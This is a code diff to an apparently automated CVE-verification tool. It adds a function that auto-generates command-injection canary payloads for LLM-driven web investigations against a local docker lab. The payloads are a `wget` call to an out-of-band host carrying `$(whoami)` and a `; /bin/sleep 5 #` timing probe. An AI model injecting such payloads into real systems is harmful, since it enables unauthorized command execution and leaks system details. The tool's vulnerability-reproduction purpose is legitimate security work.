@@ -3261,6 +3261,35 @@ def _notes_param(key: str, notes: dict, params, pick_fn, hints) -> "Optional[str
     return (llm_val if (llm_val and llm_val in param_names) else None) or pick_fn(params, hints)
 
 
+def _make_rce_canary_payload(notes: dict) -> Optional[dict]:
+    """Auto-generate an RCE canary payload when the LLM didn't supply one.
+
+    Two strategies (in priority order):
+    1. OAST out-of-band: `wget http://$BINORACLE_OAST_URL/$(whoami)` — requires
+       BINORACLE_OAST_URL env var; confirm_string is the whoami response in
+       the OAST server log (not automatable here, used as doc).
+    2. Timing: `; /bin/sleep 5 #` appended to the existing param value.
+       The verifier must check elapsed > 4.5s to confirm.
+       confirm_string="__RCE_TIMING__" is a sentinel the caller may use.
+
+    Returns {"payload": ..., "confirm_string": ..., "http_method": ...} or None.
+    """
+    import os as _os_rce
+    oast_url = _os_rce.environ.get("BINORACLE_OAST_URL", "")
+    param = (notes.get("cmd_param") or notes.get("parameters") or "")
+    if isinstance(param, (list, tuple)):
+        param = param[0] if param else "cmd"
+    elif isinstance(param, dict):
+        param = next(iter(param), "cmd")
+    base_val = "1"
+    if oast_url:
+        payload = f"{base_val}; wget http://{oast_url.rstrip('/')}/$(whoami) #"
+        return {"payload": payload, "confirm_string": "", "http_method": "GET"}
+    # Timing canary — confirm via elapsed > 4.5s
+    payload = f"{base_val}; /bin/sleep 5 #"
+    return {"payload": payload, "confirm_string": "__RCE_TIMING__", "http_method": "GET"}
+
+
 def _build_reproduce_sh(cve_id: str, poc: dict, confidence: str = "confirmed") -> str:
     """Generates a standalone reproduce.sh from an exploit_poc dict.
 
@@ -11120,6 +11149,12 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                 from .wpverify import _CMD_HINTS
                 params = notes.get("parameters") or []
                 cmd_p = _notes_param("cmd_param", notes, params, _pick_param, _CMD_HINTS)
+                # Auto-inject RCE canary when LLM didn't supply a payload
+                if not notes.get("payload"):
+                    _rce = _make_rce_canary_payload(notes)
+                    if _rce:
+                        notes.setdefault("payload", _rce["payload"])
+                        notes.setdefault("confirm_string", _rce["confirm_string"])
                 _inject_custom_docker_lab(str(fr.local_path), notes, step)
                 step(("intentando verificacion DINAMICA GENERICA -- fichero canario via docker "
                      "exec, el objetivo se construye desde su propio Dockerfile/compose..." if es
